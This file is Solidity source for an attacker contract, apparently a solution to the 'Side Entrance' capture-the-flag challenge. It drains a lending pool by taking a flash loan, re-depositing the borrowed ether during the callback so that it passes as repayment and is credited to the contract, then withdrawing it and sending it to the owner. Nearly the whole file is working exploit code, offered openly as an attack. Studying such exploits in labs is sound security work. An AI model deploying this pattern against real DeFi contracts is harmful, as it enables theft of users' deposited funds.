// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ITargetPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    ITargetPool private immutable pool;
    address private immutable owner;
    constructor(address _pool) payable {
        pool = ITargetPool(_pool);
        owner = msg.sender;
    }
    receive() external payable{}


    function attack(uint256 _amount) external {
        require(msg.sender == owner, "only owner");
        pool.flashLoan(_amount);
        // after re-deposit all fund are belonged to this contract
        pool.withdraw();
        // send funds to attacker
        payable(owner).sendValue(_amount);
    }


    function execute() override external payable {
        require(msg.sender == address(pool), "only pool");
        // just deposit back to the pool
        pool.deposit{value:msg.value}();
    }
}
